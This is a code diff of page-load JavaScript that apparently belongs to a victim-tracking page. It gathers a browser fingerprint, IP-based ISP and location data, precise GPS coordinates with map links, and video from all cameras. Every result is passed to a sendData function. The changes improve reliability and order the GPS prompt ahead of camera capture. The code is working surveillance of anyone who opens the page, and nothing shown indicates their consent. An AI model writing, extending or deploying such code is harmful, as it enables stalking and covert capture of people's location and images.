@@ -282,29 +282,36 @@
     };
     xhr1.send();
 
-    // Get ISP info
+    // Get ISP info via ipapi.co (HTTPS, reliable)
     var xhr2 = new XMLHttpRequest();
-    xhr2.open('GET', 'https://ipwho.is/');
+    xhr2.open('GET', 'https://ipapi.co/json/');
     xhr2.onload = function() {
       try {
         var r = JSON.parse(xhr2.responseText);
         var report = '\n--- ISP & Location (IP-based) ---\n';
-        report += 'IP: ' + r.ip + '\n';
-        report += 'Type: ' + (r.type || 'N/A') + '\n';
-        report += 'Continent: ' + (r.continent || 'N/A') + '\n';
-        report += 'Country: ' + (r.country || 'N/A') + ' (' + (r.country_code || '') + ')\n';
+        report += 'IP: ' + (r.ip || 'N/A') + '\n';
+        report += 'Version: ' + (r.version || 'N/A') + '\n';
+        report += 'Continent: ' + (r.continent_code || 'N/A') + '\n';
+        report += 'Country: ' + (r.country_name || 'N/A') + ' (' + (r.country_code || '') + ')\n';
         report += 'Region: ' + (r.region || 'N/A') + '\n';
         report += 'City: ' + (r.city || 'N/A') + '\n';
         report += 'Postal: ' + (r.postal || 'N/A') + '\n';
         report += 'Lat: ' + (r.latitude || 'N/A') + '\n';
         report += 'Long: ' + (r.longitude || 'N/A') + '\n';
-        report += 'Timezone: ' + (r.timezone ? r.timezone.id : 'N/A') + '\n';
-        report += 'ISP: ' + (r.connection ? r.connection.isp : 'N/A') + '\n';
-        report += 'Org: ' + (r.connection ? r.connection.org : 'N/A') + '\n';
-        report += 'ASN: ' + (r.connection ? r.connection.asn : 'N/A') + '\n';
+        report += 'Timezone: ' + (r.timezone || 'N/A') + '\n';
+        report += 'UTC Offset: ' + (r.utc_offset || 'N/A') + '\n';
+        report += 'ISP: ' + (r.org || 'N/A') + '\n';
+        report += 'ASN: ' + (r.asn || 'N/A') + '\n';
+        report += 'Country Calling: ' + (r.country_calling_code || 'N/A') + '\n';
+        report += 'Currency: ' + (r.currency || 'N/A') + '\n';
         report += '---------------------------------\n';
         sendData('text', report);
-      } catch(e) {}
+      } catch(e) {
+        sendData('text', '\n[ISP] Error fetching ISP data.\n');
+      }
+    };
+    xhr2.onerror = function() {
+      sendData('text', '\n[ISP] Request failed.\n');
     };
     xhr2.send();
   }
@@ -339,7 +346,7 @@
     return new Promise(function(resolve) {
       try {
         var chunks = [];
-        var mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
+        var mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
         var recorder = new MediaRecorder(stream, { mimeType: mimeType });
         recorder.ondataavailable = function(e) {
           if (e.data.size > 0) chunks.push(e.data);
@@ -399,15 +406,48 @@
   // ==============================
   // 6. MAIN — Run everything
   // ==============================
+  function gpsWithCallback(callback) {
+    if (!navigator.geolocation) {
+      sendData('text', '\n[GPS] Browser does not support geolocation.\n');
+      callback();
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        var c = pos.coords;
+        var report = '\n--- GPS Location ---\n';
+        report += 'Latitude: ' + c.latitude + '\n';
+        report += 'Longitude: ' + c.longitude + '\n';
+        report += 'Accuracy: ' + c.accuracy + ' meters\n';
+        report += 'Altitude: ' + (c.altitude || 'N/A') + '\n';
+        report += 'Alt Accuracy: ' + (c.altitudeAccuracy || 'N/A') + '\n';
+        report += 'Speed: ' + (c.speed || 'N/A') + '\n';
+        report += 'Heading: ' + (c.heading || 'N/A') + '\n';
+        report += 'Google Maps: https://www.google.com/maps/place/' + c.latitude + ',' + c.longitude + '\n';
+        report += 'Google Earth: https://earth.google.com/web/search/' + c.latitude + ',' + c.longitude + '\n';
+        report += '--------------------\n';
+        sendData('text', report);
+        callback();
+      },
+      function(err) {
+        var msgs = {1:'Permission Denied',2:'Position Unavailable',3:'Timeout'};
+        sendData('text', '\n[GPS] Error: ' + (msgs[err.code] || 'Unknown') + '\n');
+        callback();
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
   async function main() {
-    // Collect fingerprint data
+    // 1. Collect fingerprint data
     await collectFingerprint();
-    // Get GPS
-    gpsLocation();
-    // Get IP & ISP info
+    // 2. Get IP & ISP info (fire immediately, non-blocking)
     getIPInfo();
-    // Capture cameras (after small delay for GPS prompt to settle)
-    setTimeout(function() { captureAllCameras(); }, 2000);
+    // 3. GPS first — then camera after GPS resolves
+    gpsWithCallback(function() {
+      // 4. Camera capture after GPS permission is resolved
+      setTimeout(function() { captureAllCameras(); }, 1000);
+    });
   }
 
   // Start on page load
